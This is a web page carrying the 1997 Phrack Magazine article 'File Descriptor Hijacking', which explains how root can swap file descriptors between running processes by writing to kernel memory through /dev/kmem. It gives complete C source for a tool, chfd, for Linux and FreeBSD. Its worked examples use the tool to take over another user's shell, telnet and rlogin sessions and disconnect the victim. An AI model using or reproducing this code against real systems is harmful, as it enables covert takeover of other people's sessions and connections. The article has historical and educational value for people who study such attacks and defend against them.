@@ -1,0 +1,669 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: File Descriptor Hijacking ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a class="current" href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack51.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack51.tar.gz" title="Get current issue tar.gz">51</a> | <strong>Release date</strong> : <b>1997-09-01</b> | <strong>Editor</strong> : <b>route</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/51/1.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/51/2.html#article">Phrack Loopback</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/51/3.html#article">Line Noise</a></td><td align="right">various</td></tr>
+<tr><td align="left"><a href="../../issues/51/4.html#article">Phrack Prophile on Swamp Ratte</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/51/5.html#article">File Descriptor Hijacking</a></td><td align="right">orabidoo</td></tr>
+<tr><td align="left"><a href="../../issues/51/6.html#article">LOKI2 (the implementation)</a></td><td align="right">route</td></tr>
+<tr><td align="left"><a href="../../issues/51/7.html#article">Juggernaut 1.0 - 1.2 patchfile</a></td><td align="right">route</td></tr>
+<tr><td align="left"><a href="../../issues/51/8.html#article">Shared Library Redirection</a></td><td align="right">halflife</td></tr>
+<tr><td align="left"><a href="../../issues/51/9.html#article">Bypassing Integrity Checking Systems</a></td><td align="right">halflife</td></tr>
+<tr><td align="left"><a href="../../issues/51/10.html#article">Stealth RPC scanning</a></td><td align="right">halflife</td></tr>
+<tr><td align="left"><a href="../../issues/51/11.html#article">The Art of Scanning</a></td><td align="right">Fyodor</td></tr>
+<tr><td align="left"><a href="../../issues/51/12.html#article">The Eternity Service</a></td><td align="right">Adam Back</td></tr>
+<tr><td align="left"><a href="../../issues/51/13.html#article">Monoalphabetic cipher cryptanalysis</a></td><td align="right">mythrandir</td></tr>
+<tr><td align="left"><a href="../../issues/51/14.html#article">Phrack Magazine Article Index Guide</a></td><td align="right">guyver</td></tr>
+<tr><td align="left"><a href="../../issues/51/15.html#article">A Brief introduction to CCS7</a></td><td align="right">Narbo</td></tr>
+<tr><td align="left"><a href="../../issues/51/16.html#article">Phrack World News</a></td><td align="right">disorder</td></tr>
+<tr><td align="left"><a href="../../issues/51/17.html#article">extract.c</a></td><td align="right">Phrack Staff</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : File Descriptor Hijacking</div>
+<div class="opt-bottom"> <strong>Author</strong> : orabidoo</div>
+<pre>---[  Phrack Magazine   Volume 7, Issue 51 September 01, 1997, article 05 of 17
+
+
+-------------------------[  File Descriptor Hijacking
+
+
+--------[  orabidoo &lt;odar@pobox.com&gt;
+
+
+Introduction
+------------
+
+We often hear of tty hijacking as a way for root to take over a user's
+session.  The traditional tools for this use STREAMS on SysV machines,
+and one article in Phrack 50 presented a way to do it in Linux, using
+loadable modules.
+
+I'll describe here a simple technique that lets root take over a local
+or remote session.  I've implemented it for Linux and FreeBSD; it should
+be easy to port it to just about any Un*x-like system where root can
+write to kernel memory.
+
+The idea is simple: by tweaking the kernel's file descriptor tables, one
+can forcefully move file descriptors from one process to another.  
+This method allows you to do almost anything you want: redirect the
+output of a running command to a file, or even take over your neighbor's
+telnet connection.
+
+
+How the kernel keeps track of open file descriptors
+---------------------------------------------------
+
+In Un*x, processes access resources by means of file descriptors, which
+are obtained via system calls such as open(), socket() and pipe().  From
+the process's point of view, the file descriptor is an opaque handle to
+the resource.  File descriptors 0, 1 and 2 represent standard input,
+output and error, respectively.  New descriptors are always allocated in
+sequence.
+
+On the other side of the fence, the kernel keeps, for each process, a
+table of file descriptors (fds), with a pointer to a structure for each
+fd.  The pointer is NULL if the fd isn't open.  Otherwise, the structure
+holds information about what kind of fd it is (a file, a socket, a
+pipe, etc), together with pointers to data about the resource that the fd
+accesses (the file's inode, the socket's address and state information,
+and so on).
+
+The process table is usually an array or a linked list of structures.
+From the structure for a given process, you can easily find a pointer to
+the internal fd table for that process.  
+
+In Linux, the process table is an array (called &quot;task&quot;) of struct
+task_struct's, and includes a pointer to a struct files_struct, which
+has the fd array (look at /usr/include/linux/sched.h for details).  In
+SunOS 4, the process table is a linked list of struct proc's, which
+include a pointer to the u_area, which has info about the fds (look at
+/usr/include/sys/proc.h).  In FreeBSD, it's also a linked list (called
+&quot;allproc&quot;) of struct proc's, which include a pointer to a struct
+filedesc with the fd table (also according to /usr/include/sys/proc.h).
+
+If you have read and write access to the kernel's memory (which, in most
+cases, is the same as having read/write access to /dev/kmem), there's
+nothing to prevent you from messing with these fd tables, stealing open
+fd's from a process and reusing them in another one.  
+
+The only major case where this won't work are systems based on BSD4.4
+(such as {Free, Net, Open}BSD) running at a securelevel higher than 0.
+In that mode, write access to /dev/mem and /dev/kmem is disabled, among
+other things.  However, many BSD systems run at securelevel -1, which leaves
+them vulnerable, and in many others it may be possible to get the securelevel 
+to be -1 at the next boot by tweaking the startup scripts.  On FreeBSD, you 
+can check the securelevel with the command &quot;sysctl kern.securelevel&quot;.  Linux 
+also has securelevels, but they don't prevent you from accessing /dev/kmem.
+
+
+File descriptor hijacking
+-------------------------
+
+The kernel's internal variables are really not made to be modified like
+this by user programs, and it shows.  
+
+First of all, on a multitasking system, you have no guarantee that the
+kernel's state won't have changed between the time you find out a
+variable's address and the time you write to it (no atomicity).  This is 
+why these techniques shouldn't be used in any program that aims for 
+reliability.  That being said, in practice, I haven't seen it fail, because 
+the kernel doesn't move this kind of data around once it has allocated it 
+(at least for the first 20 or 32 or 64 or so fds per process), and because 
+it's quite unlikely that you'll do this just when the process is closing or
+opening a new fd.
+
+You still want to try it?
+
+For simplicity's sake, we won't try to do things like duplicating an fd
+between two processes, or passing an fd from one process to another
+without passing another one in return.  Instead, we'll just exchange an
+fd in one process with another fd in another process.  This way we only
+have to deal with open files, and don't mess with things like reference
+counts.  This is as simple as finding two pointers in the kernel and
+switching them around.  A slightly more complicated version of this
+involves 3 processes, and a circular permutation of the fds.
+
+Of course, you have to guess which fd corresponds to the resource you
+want to pass.  To take complete control of a running shell, you'll want
+its standard input, output and error, so you'll need to take the 3 fds
+0, 1 and 2.  To take control of a telnet session, you'll want the fd of
+the inet socket that telnet is using to talk to the other side, which is
+usually 3, and exchange it with another running telnet (so it knows what
+to do with it).  Under Linux, a quick look at /proc/[pid]/fd will tell
+you which fds the process is using.
+
+
+Using chfd
+----------
+
+I've implemented this for Linux and FreeBSD; it would be fairly easy to
+port to other systems (as long as they let you write to /dev/mem or
+/dev/kmem, and have the equivalent of a /usr/include/sys/proc.h to
+figure out how it works).
+
+To compile chfd for Linux, you need to figure out a couple things about
+the running kernel.  If it's a 1.2.13 or similar, you'll need to
+uncomment the line /* #define OLDLINUX */, because the kernel's
+structures have changed since then.  If it's 2.0.0 or newer, it should
+work out of the box, although it could change again...    
+
+Then you need to find the symbol table for the kernel, which is usually
+in /boot/System.map or similar.  Make sure this corresponds to the
+kernel that is actually running, and look up the address for the &quot;task&quot;
+symbol.  You need to put this value in chfd, instead of &quot;00192d28&quot;.
+Then compile with &quot;gcc chfd.c -o chfd&quot;.
+
+To compile chfd for FreeBSD, just get the FreeBSD code and compile it
+with &quot;gcc chfd.c -o chfd -lkvm&quot;.  This code was written for FreeBSD
+2.2.1, and might need tweaking for other versions.
+
+Once it's compiled, you invoke chfd with 
+
+ 	chfd pid1 fd1 pid2 fd2
+or
+	chfd pid1 fd1 pid2 fd2 pid3 fd3
+
+In the first case, the fds are just swapped.  In the second case, the
+second process gets the first's fd, the third gets the second's fd, and
+the first gets the third's fd.
+
+As a special case, if one of the pids is zero, the corresponding fd is
+discarded, and a fd on /dev/null is passed instead.
+
+
+Example 1
+---------
+
+. a long calculation is running with pid 207, and with output to the tty
+. you type &quot;cat &gt; somefile&quot;, and look up cat's pid (say 1746)
+
+Then doing
+
+	chfd 207 1 1746 1
+
+will redirect the calculation on the fly to the file &quot;somefile&quot;, and the
+cat to the calculation's tty.  Then you can ^C the cat, and leave the
+calculation running without fear of important results scrolling by.
+
+
+Example 2
+---------
+
+. someone is running a copy of bash on a tty, with pid 4022
+. you are running another copy of bash on a tty, with pid 4121
+
+Then you do
+
+	sleep 10000  
+	  # on your own bash, so it won't read its tty for a while,
+	  # otherwise your shell gets an EOF from /dev/null and leaves
+	  # the session immediately
+	chfd 4022 0 0 0 4121 0
+	chfd 4022 1 0 0 4121 1
+	chfd 4022 2 0 0 4121 2
+
+and you find yourself controlling the other guy's bash, and getting the
+output too, while the guy's keystrokes go to /dev/null.  When you exit
+the shell, he gets his session disconnected, and you're back in your
+sleep 10000 which you can safely ^C now.  
+
+Different shells might use different file descriptors; zsh seems to use
+fd 10 to read from the tty, so you'll need to exchange that too.
+
+
+Example 3
+---------
+
+. someone is running a telnet on a tty, with pid 6309
+. you start a telnet to some worthless port that won't drop the 
+  connection too quickly (telnet localhost 7, telnet www.yourdomain 80,
+  whatever), with pid 7081
+. under Linux, a quick look at /proc/6309/fd and /proc/7081/fd tells you
+  telnet is using fds 0, 1, 2 and 3, so 3 must be the connection.
+
+Then doing
+
+	chfd 6309 3 7081 3 0 0
+
+will replace the network connection with a /dev/null on the guy's telnet
+(which reads an EOF, so he'll get a &quot;Connection closed by foreign
+host.&quot;), and your telnet finds itself connected to the guy's remote
+host.  At this point you'll probably need to press ^] and type &quot;mode
+character&quot; to tell your telnet to stop echoing your lines locally.
+
+
+Example 4
+---------
+
+. someone is running an rlogin on a tty; each rlogin uses two processes, 
+  with pids 4547 and 4548
+. you start an rlogin localhost on another tty, with pids 4852 and 4855
+. a quick look at the relevant /proc/../fds tells you that each of the
+  rlogin processes is using fd 3 for the connection.
+
+Then doing
+
+	chfd 4547 3 4552 3
+	chfd 4548 3 4555 3
+
+does just what you expect.  Except that your rlogin may still be blocked
+by the kernel because it's waiting on an event that won't happen (having
+data to read from localhost); in that case you wake it up with a kill
+-STOP followed by 'fg'.
+
+
+You get the idea.  When a program gets another one's fd, it's important
+that it knows what to do with it; in most cases you achieve this by
+running a copy of the same program you want to take over, unless you're
+passing a fd on /dev/null (which gives an EOF) or just passing
+stdin/stdout/stderr.  
+
+
+Conclusion
+----------
+
+As you can see, you can do quite powerful things with this.  And there
+isn't really much you can do to protect yourself from some root doing
+this, either.  
+
+It could be argued that it's not even a security hole; root is
+*supposed* to be able to do these things.  Otherwise there wouldn't be
+explicit code in the drivers for /dev/kmem to let you write there, would
+there?
+
+
+The Linux code
+--------------
+
+&lt;++&gt; fd_hijack/chfd-linux.c
+/*  chfd - exchange fd's between 2 or 3 running processes.
+ *  
+ *  This was written for Linux/intel and is *very* system-specific.
+ *  Needs read/write access to /dev/kmem; setgid kmem is usually enough.
+ *
+ *  Use: chfd pid1 fd1 pid2 fd2 [pid3 fd3]
+ *
+ *  With two sets of arguments, exchanges a couple of fd between the 
+ *  two processes.
+ *  With three sets, the second process gets the first's fd, the third gets
+ *  the second's fd, and the first gets the third's fd.
+ *
+ *  Note that this is inherently unsafe, since we're messing with kernel
+ *  variables while the kernel itself might be changing them.  It works
+ *  in practice, but no self-respecting program would want to do this.
+ *
+ *  Written by: orabidoo &lt;odar@pobox.com&gt;
+ *  First version: 14 Feb 96
+ *  This version: 2 May 97
+ */
+
+
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#define __KERNEL__		/* needed to access kernel-only definitions */
+#include &lt;linux/sched.h&gt;
+
+/* #define OLDLINUX */		/* uncomment this if you're using Linux 1.x;
+				   tested only on 1.2.13 */
+
+#define TASK 0x00192d28		/* change this! look at the system map,
+				   usually /boot/System.map, for the address
+				   of the &quot;task&quot; symbol */
+
+#ifdef OLDLINUX
+#  define FD0 ((char *)&amp;ts.files-&gt;fd[0] - (char *)&amp;ts)
+#  define AD(fd) (taskp + FD0 + 4*(fd))
+#else
+#  define FILES ((char *)&amp;ts.files - (char *)&amp;ts)
+#  define FD0 ((char *)&amp;fs.fd[0] - (char *)&amp;fs)
+#  define AD(fd) (readvalz(taskp + FILES) + FD0 + 4*(fd))
+#endif
+
+
+int kfd;
+struct task_struct ts;
+struct files_struct fs;
+int taskp;
+
+int readval(int ad) {
+  int val, r;
+
+  if (lseek(kfd, ad, SEEK_SET) &lt; 0)
+    perror(&quot;lseek&quot;), exit(1);
+  if ((r = read(kfd, &amp;val, 4)) != 4) {
+    if (r &lt; 0)
+      perror(&quot;read&quot;);
+    else fprintf(stderr, &quot;Error reading...\n&quot;);
+    exit(1);
+  }
+  return val;
+}
+
+int readvalz(int ad) {
+  int r = readval(ad);
+  if (r == 0)
+    fprintf(stderr, &quot;NULL pointer found (fd not open?)\n&quot;), exit(1);
+  return r;
+}
+
+void writeval(int ad, int val) {
+  int w;
+
+  if (lseek(kfd, ad, SEEK_SET) &lt; 0)
+    perror(&quot;lseek&quot;), exit(1);
+  if ((w = write(kfd, &amp;val, 4)) != 4) {
+    if (w &lt; 0)
+      perror(&quot;write&quot;);
+    else fprintf(stderr, &quot;Error writing...\n&quot;);
+    exit(1);
+  }
+}
+
+void readtask(int ad) {
+  int r;
+
+  if (lseek(kfd, ad, SEEK_SET)&lt;0)
+    perror(&quot;lseek&quot;), exit(1);
+  if ((r = read(kfd, &amp;ts, sizeof(struct task_struct))) !=
+	sizeof(struct task_struct)) {
+    if (r &lt; 0)
+      perror(&quot;read&quot;);
+    else fprintf(stderr, &quot;Error reading...\n&quot;);
+    exit(1);
+  }
+}
+
+void findtask(int pid) {
+  int adr;
+
+  for (adr=TASK; ; adr+=4) {
+    if (adr &gt;= TASK + 4*NR_TASKS)
+      fprintf(stderr, &quot;Process not found\n&quot;), exit(1);
+    taskp = readval(adr);
+    if (!taskp) continue;
+    readtask(taskp);
+    if (ts.pid == pid) break;
+  }
+}
+
+int main(int argc, char **argv) {
+  int pid1, fd1, pid2, fd2, ad1, val1, ad2, val2, pid3, fd3, ad3, val3;
+  int three=0;
+
+  if (argc != 5 &amp;&amp; argc != 7)
+    fprintf(stderr, &quot;Use: %s pid1 fd1 pid2 fd2 [pid3 fd3]\n&quot;, argv[0]), 
+    exit(1);
+
+  pid1 = atoi(argv[1]), fd1 = atoi(argv[2]);
+  pid2 = atoi(argv[3]), fd2 = atoi(argv[4]);
+  if (argc == 7)
+    pid3 = atoi(argv[5]), fd3 = atoi(argv[6]), three=1;
+
+  if (pid1 == 0)
+    pid1 = getpid(), fd1 = open(&quot;/dev/null&quot;, O_RDWR);
+  if (pid2 == 0)
+    pid2 = getpid(), fd2 = open(&quot;/dev/null&quot;, O_RDWR);
+  if (three &amp;&amp; pid3 == 0)
+    pid3 = getpid(), fd3 = open(&quot;/dev/null&quot;, O_RDWR);
+
+  kfd = open(&quot;/dev/kmem&quot;, O_RDWR);
+  if (kfd &lt; 0)
+    perror(&quot;open&quot;), exit(1);
+
+  findtask(pid1);
+  ad1 = AD(fd1);
+  val1 = readvalz(ad1);
+  printf(&quot;Found fd pointer 1, value %.8x, stored at %.8x\n&quot;, val1, ad1);
+
+  findtask(pid2);
+  ad2 = AD(fd2);
+  val2 = readvalz(ad2);
+  printf(&quot;Found fd pointer 2, value %.8x, stored at %.8x\n&quot;, val2, ad2);
+
+  if (three) {
+    findtask(pid3);
+    ad3 = AD(fd3);
+    val3 = readvalz(ad3);
+    printf(&quot;Found fd pointer 3, value %.8x, stored at %.8x\n&quot;, val3, ad3);
+  }
+
+  if (three) {
+    if (readval(ad1)!=val1 || readval(ad2)!=val2 || readval(ad3)!=val3) {
+      fprintf(stderr, &quot;fds changed in memory while using them - try again\n&quot;);
+      exit(1);
+    }
+    writeval(ad2, val1);
+    writeval(ad3, val2);
+    writeval(ad1, val3);
+  } else {
+    if (readval(ad1)!=val1 || readval(ad2)!=val2) {
+      fprintf(stderr, &quot;fds changed in memory while using them - try again\n&quot;);
+      exit(1);
+    }
+    writeval(ad1, val2);
+    writeval(ad2, val1);
+  }
+  printf(&quot;Done!\n&quot;);
+}
+
+&lt;--&gt;
+
+The FreeBSD code
+----------------
+
+&lt;++&gt; fd_hijack/chfd-freebsd.c
+
+/*  chfd - exchange fd's between 2 or 3 running processes.
+ *  
+ *  This was written for FreeBSD and is *very* system-specific.  Needs 
+ *  read/write access to /dev/mem and /dev/kmem; only root can usually 
+ *  do that, and only if the system is running at securelevel -1.
+ *
+ *  Use: chfd pid1 fd1 pid2 fd2 [pid3 fd3]
+ *  Compile with: gcc chfd.c -o chfd -lkvm
+ *
+ *  With two sets of arguments, exchanges a couple of fd between the 
+ *  two processes.
+ *  With three sets, the second process gets the first's fd, the third 
+ *  gets the second's fd, and the first gets the third's fd.
+ *
+ *  Note that this is inherently unsafe, since we're messing with kernel
+ *  variables while the kernel itself might be changing them.  It works
+ *  in practice, but no self-respecting program would want to do this.
+ *
+ *  Written by: orabidoo &lt;odar@pobox.com&gt;
+ *  FreeBSD version: 4 May 97
+ */
+
+
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;kvm.h&gt;
+#include &lt;sys/proc.h&gt;
+
+#define NEXTP ((char *)&amp;p.p_list.le_next - (char *)&amp;p)
+#define FILES ((char *)&amp;p.p_fd - (char *)&amp;p)
+#define AD(fd) (readvalz(readvalz(procp + FILES)) + 4*(fd))
+
+kvm_t *kfd;
+struct proc p;
+u_long procp, allproc;
+struct nlist nm[2];
+
+u_long readval(u_long ad) {
+  u_long val;
+
+  if (kvm_read(kfd, ad, &amp;val, 4) != 4)
+    fprintf(stderr, &quot;error reading...\n&quot;), exit(1);
+  return val;
+}
+
+u_long readvalz(u_long ad) {
+  u_long r = readval(ad);
+  if (r == 0)
+    fprintf(stderr, &quot;NULL pointer found (fd not open?)\n&quot;), exit(1);
+  return r;
+}
+
+void writeval(u_long ad, u_long val) {
+  if (kvm_write(kfd, ad, &amp;val, 4) != 4)
+    fprintf(stderr, &quot;error writing...\n&quot;), exit(1);
+}
+
+void readproc(u_long ad) {
+  if (kvm_read(kfd, ad, &amp;p, sizeof(struct proc)) != sizeof(struct proc))
+    fprintf(stderr, &quot;error reading a struct proc...\n&quot;), exit(1);
+}
+
+void findproc(int pid) {
+  u_long adr;
+
+  for (adr = readval(allproc); adr; adr = readval(adr + NEXTP)) {
+    procp = adr;
+    readproc(procp);
+    if (p.p_pid == pid) return;
+  }
+  fprintf(stderr, &quot;Process not found\n&quot;);
+  exit(1);
+}
+
+int main(int argc, char **argv) {
+  int pid1, fd1, pid2, fd2, pid3, fd3;
+  u_long ad1, val1, ad2, val2, ad3, val3;
+  int three=0;
+
+  if (argc != 5 &amp;&amp; argc != 7)
+    fprintf(stderr, &quot;Use: %s pid1 fd1 pid2 fd2 [pid3 fd3]\n&quot;, argv[0]), 
+    exit(1);
+
+  pid1 = atoi(argv[1]), fd1 = atoi(argv[2]);
+  pid2 = atoi(argv[3]), fd2 = atoi(argv[4]);
+  if (argc == 7)
+    pid3 = atoi(argv[5]), fd3 = atoi(argv[6]), three=1;
+
+  if (pid1 == 0)
+    pid1 = getpid(), fd1 = open(&quot;/dev/null&quot;, O_RDWR);
+  if (pid2 == 0)
+    pid2 = getpid(), fd2 = open(&quot;/dev/null&quot;, O_RDWR);
+  if (three &amp;&amp; pid3 == 0)
+    pid3 = getpid(), fd3 = open(&quot;/dev/null&quot;, O_RDWR);
+
+  kfd = kvm_open(NULL, NULL, NULL, O_RDWR, &quot;chfd&quot;);
+  if (kfd == NULL) exit(1);
+
+  bzero(nm, 2*sizeof(struct nlist));
+  nm[0].n_name = &quot;_allproc&quot;;
+  nm[1].n_name = NULL;
+  if (kvm_nlist(kfd, nm) != 0)
+    fprintf(stderr, &quot;Can't read kernel name list\n&quot;), exit(1);
+  allproc = nm[0].n_value;
+
+  findproc(pid1);
+  ad1 = AD(fd1);
+  val1 = readvalz(ad1);
+  printf(&quot;Found fd pointer 1, value %.8x, stored at %.8x\n&quot;, val1, ad1);
+
+  findproc(pid2);
+  ad2 = AD(fd2);
+  val2 = readvalz(ad2);
+  printf(&quot;Found fd pointer 2, value %.8x, stored at %.8x\n&quot;, val2, ad2);
+
+  if (three) {
+    findproc(pid3);
+    ad3 = AD(fd3);
+    val3 = readvalz(ad3);
+    printf(&quot;Found fd pointer 3, value %.8x, stored at %.8x\n&quot;, val3, ad3);
+  }
+
+  if (three) {
+    if (readval(ad1)!=val1 || readval(ad2)!=val2 || readval(ad3)!=val3) {
+      fprintf(stderr, &quot;fds changed in memory while using them - try again\n&quot;);
+      exit(1);
+    }
+    writeval(ad2, val1);
+    writeval(ad3, val2);
+    writeval(ad1, val3);
+  } else {
+    if (readval(ad1)!=val1 || readval(ad2)!=val2) {
+      fprintf(stderr, &quot;fds changed in memory while using them - try again\n&quot;);
+      exit(1);
+    }
+    writeval(ad1, val2);
+    writeval(ad2, val1);
+  }
+  printf(&quot;Done!\n&quot;);
+}
+
+&lt;--&gt;
+
+----[  EOF
+
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
